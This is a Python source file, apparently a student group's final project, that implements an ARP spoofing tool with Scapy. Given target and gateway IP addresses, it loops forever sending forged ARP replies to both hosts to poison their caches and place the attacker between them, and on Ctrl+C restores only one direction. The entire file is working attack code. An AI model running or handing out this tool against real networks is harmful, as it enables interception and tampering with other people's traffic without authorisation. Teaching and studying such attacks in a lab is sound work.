# Spoofing Program Final Group Project
# Project Group Set 3 - Caban Hernandez, Craine, Hutchinson, Thota

# imported os to allow python to have os dependent functionality
import os
# Imported Scapy for spoofing functions
import scapy.all as scapy
# Imported argparse for writing simple command line interface
import argparse
# Imported time for various time-related functions, such as sleep
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="used for setting the target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway", help="used for setting the spoofed gateway IP address")
    return parser.parse_args()


def get_mac(ip):
    # pdst is where ARP packets should go, i.e., the target
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target, gateway):
    # pdst is where ARP packets should go, i.e., the target
    # hwdst is the destination hardware address
    packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(target), psrc=gateway)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def main():
    arguments = get_arguments()
    print(arguments)
    if arguments.target is None or arguments.gateway is None:
        print("You must include arguments while running this script.")
        print("Your options are:\n\t -t/--target for the target IP address \n\t -g/--gateway for the spoofed gateway"
              "IP address")
        print("Please see https://docs.python.org/3/library/argparse.html for additional information")
        quit()
    else:
        target = arguments.target
        gateway = arguments.gateway
        try:
            sent_packets_count = 0
            while True:
                spoof(target, gateway)
                spoof(gateway, target)
                sent_packets_count = sent_packets_count + 2
                print("\r[*] Packets Sent " + str(sent_packets_count), end="")
                time.sleep(2)
        except KeyboardInterrupt:
            print("\nCtrl + C pressed.............Exiting")
            restore(target, gateway)
            #restore(gateway, target)


# This ensures that the main() function only runs automatically when this file is directly called.
# Without this check it could be triggered upon a successful import to another python file.
if __name__ == '__main__':
    main()
